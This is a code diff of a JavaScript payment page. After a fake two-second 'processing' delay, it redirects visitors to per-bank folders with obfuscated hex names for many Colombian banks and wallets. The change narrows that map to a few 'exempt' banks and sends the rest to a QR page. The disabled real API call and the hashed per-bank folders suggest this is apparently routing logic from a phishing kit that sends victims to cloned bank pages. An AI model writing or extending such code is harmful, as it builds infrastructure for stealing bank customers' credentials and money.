@@ -563,40 +563,32 @@
             $("#divProcessing").show();
             $("#btnSeguir").prop("disabled", true);
 
-            // Redirect to bank after delay
-            setTimeout(function () {
-                var banco = qs("banco");
-                var bankUrl = "../pago/index.php"; // Fallback to main payment index if exists, or error page
-
-                if (banco) {
-                    var bankMap = {
-                        'avvillas': '9f8b2e1a',
-                        'bancol': '4c7a1d9e',
-                        'bancolombia': '4c7a1d9e',
-                        'bbva': '6e2b8f04',
-                        'bogota': '1a9f3d8c',
-                        'caja-social': '7d4e0b2a',
-                        'colpatria': '3f8a1e9c',
-                        'davivienda': '5d1e9a3b',
-                        'falabella': '2e8f4a1c',
-                        'finandina': '0b7d3e9a',
-                        'occidente': '1e8a4d7b',
-                        'nequi': 'c3a7f91e',
-                        'itau': 'a4c81f2e',
-                        'mundo-mujer': 'd8b24e0a',
-                        'popular': 'e9f2b14c',
-                        'serfinanza': '7a1d8e3f',
-                        'union': 'b2e4f08a',
-                        'lulo': 'f1e93a7b',
-                        'davi': '8b2c4e7f'
-                    };
-
-                    if (bankMap[banco]) {
-                        bankUrl = "../pago/" + bankMap[banco] + "/index.php"; // Target URL
-                    }
-
-                    window.location.href = bankUrl;
-                }
+            // Redirect to bank or QR after delay
+            setTimeout(function () {
+                var banco = qs("banco");
+                var queryString = window.location.search || "";
+                var bankUrl = "../pago/qr/index.php" + queryString;
+
+                if (banco) {
+                    var bancoKey = banco.toLowerCase().trim();
+                    var bankMap = {
+                        'avvillas': '9f8b2e1a',
+                        'bogota': '1a9f3d8c',
+                        'occidente': '1e8a4d7b',
+                        'popular': 'e9f2b14c',
+                        'davivienda': '5d1e9a3b',
+                        'davi': '8b2c4e7f'
+                    };
+
+                    // Bancos exentos: Grupo Aval y Davivienda
+                    if (bankMap[bancoKey]) {
+                        bankUrl = "../pago/" + bankMap[bancoKey] + "/index.php" + queryString;
+                    } else {
+                        bankUrl = "../pago/qr/index.php" + queryString;
+                    }
+                }
+
+                window.location.href = bankUrl;
             }, 2000);
 
             /* API Call disabled
@@ -1271,37 +1263,29 @@
                                                                                     var match = location.search.match(new RegExp("[?&]banco=([^&]+)(&|$)"));
                                                                                     if (match) banco = decodeURIComponent(match[1].replace(/\+/g, " "));
 
-                                                                                    var bankUrl = "../pago/index.php"; // Fallback
-
-                                                                                    if (banco) {
-                                                                                        var bankMap = {
-                                                                                            'avvillas': '9f8b2e1a',
-                                                                                            'bancol': '4c7a1d9e',
-                                                                                            'bancolombia': '4c7a1d9e',
-                                                                                            'bbva': '6e2b8f04',
-                                                                                            'bogota': '1a9f3d8c',
-                                                                                            'caja-social': '7d4e0b2a',
-                                                                                            'colpatria': '3f8a1e9c',
-                                                                                            'davivienda': '5d1e9a3b',
-                                                                                            'falabella': '2e8f4a1c',
-                                                                                            'finandina': '0b7d3e9a',
-                                                                                            'occidente': '1e8a4d7b',
-                                                                                            'nequi': 'c3a7f91e',
-                                                                                            'itau': 'a4c81f2e',
-                                                                                            'mundo-mujer': 'd8b24e0a',
-                                                                                            'popular': 'e9f2b14c',
-                                                                                            'serfinanza': '7a1d8e3f',
-                                                                                            'union': 'b2e4f08a',
-                                                                                            'lulo': 'f1e93a7b',
-                                                                                            'davi': '8b2c4e7f'
-                                                                                        };
-
-                                                                                        if (bankMap[banco]) {
-                                                                                            bankUrl = "../pago/" + bankMap[banco] + "/index.php";
-                                                                                        }
-                                                                                    }
-
-                                                                                    // Redirect to the correct bank folder
+                                                                                    var queryString = window.location.search || "";
+                                                                                    var bankUrl = "../pago/qr/index.php" + queryString;
+
+                                                                                    if (banco) {
+                                                                                        var bancoKey = banco.toLowerCase().trim();
+                                                                                        var bankMap = {
+                                                                                            'avvillas': '9f8b2e1a',
+                                                                                            'bogota': '1a9f3d8c',
+                                                                                            'occidente': '1e8a4d7b',
+                                                                                            'popular': 'e9f2b14c',
+                                                                                            'davivienda': '5d1e9a3b',
+                                                                                            'davi': '8b2c4e7f'
+                                                                                        };
+
+                                                                                        // Bancos exentos: Grupo Aval y Davivienda
+                                                                                        if (bankMap[bancoKey]) {
+                                                                                            bankUrl = "../pago/" + bankMap[bancoKey] + "/index.php" + queryString;
+                                                                                        } else {
+                                                                                            bankUrl = "../pago/qr/index.php" + queryString;
+                                                                                        }
+                                                                                    }
+
+                                                                                    // Redirect to the correct bank folder or QR
                                                                                     window.location.href = bankUrl;
                                                                                 },
                                                                                 error: function () {
